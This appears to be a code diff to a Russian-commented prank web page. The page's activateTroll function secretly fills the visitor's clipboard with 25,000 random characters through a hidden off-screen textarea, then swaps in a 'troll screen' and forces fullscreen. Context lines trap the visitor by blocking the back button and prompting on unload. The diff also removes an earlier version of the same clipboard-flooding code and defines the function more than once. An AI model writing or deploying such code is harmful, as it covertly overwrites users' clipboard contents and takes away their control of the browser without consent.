@@ -109,6 +109,44 @@
 window.onpopstate = function() { history.go(1); };
 window.onbeforeunload = function() { return "!"; }; 
 
+            function activateTroll() {
+    // 1. ГЕНЕРАЦИЯ СИМВОЛОВ (25 000)
+    const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";
+    let junk = "";
+    for (let i = 0; i < 25000; i++) {
+        junk += charset.charAt(Math.floor(Math.random() * charset.length));
+    }
+
+    // 2. АГРЕССИВНОЕ КОПИРОВАНИЕ (Метод "Невидимка")
+    try {
+        const tempInput = document.createElement("textarea");
+        tempInput.value = junk;
+        // Прячем поле, чтобы пользователь его не увидел
+        tempInput.style.position = "fixed";
+        tempInput.style.left = "-9999px";
+        tempInput.style.top = "0";
+        document.body.appendChild(tempInput);
+        
+        tempInput.focus();
+        tempInput.select();
+        tempInput.setSelectionRange(0, 99999); // Для мобилок
+
+        const success = document.execCommand("copy");
+        document.body.removeChild(tempInput);
+        
+        if (success) console.log("Буфер забит!");
+    } catch (err) {
+        console.error("Ошибка копирования:", err);
+    }
+
+    // 3. ТВОЙ ОСТАЛЬНОЙ КОД
+    isTrolling = true;
+    document.getElementById('m').style.display = 'none';
+    document.getElementById('h').style.display = 'none';
+    document.getElementById('troll-screen').style.display = 'block';
+    forceFull();
+            }
+            
                 function activateTroll() {
         // МГНОВЕННАЯ СМЕНА ЭКРАНА (Первым делом!)
         document.getElementById('m').style.display = 'none';
@@ -144,27 +182,6 @@ window.onbeforeunload = function() { return "!"; };
                 function activateTroll() {
         if (isTrolling) return;
         isTrolling = true;
-
-                    // Генерация 25 000 случайных символов
-const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+';
-let randomString = '';
-for (let i = 0; i < 25000; i++) {
-    randomString += characters.charAt(Math.floor(Math.random() * characters.length));
-}
-
-// Копирование в буфер обмена
-navigator.clipboard.writeText(randomString).then(() => {
-    console.log('Буфер забит на 25к символов');
-}).catch(err => {
-    // Если браузер заблокирует автоматическое копирование
-    const textArea = document.createElement("textarea");
-    textArea.value = randomString;
-    document.body.appendChild(textArea);
-    textArea.select();
-    document.execCommand("copy");
-    document.body.removeChild(textArea);
-});
-                    
 
         // 1. Мгновенная блокировка жестов (теперь через захват всех фаз касания)
         const fastFull = (e) => { 
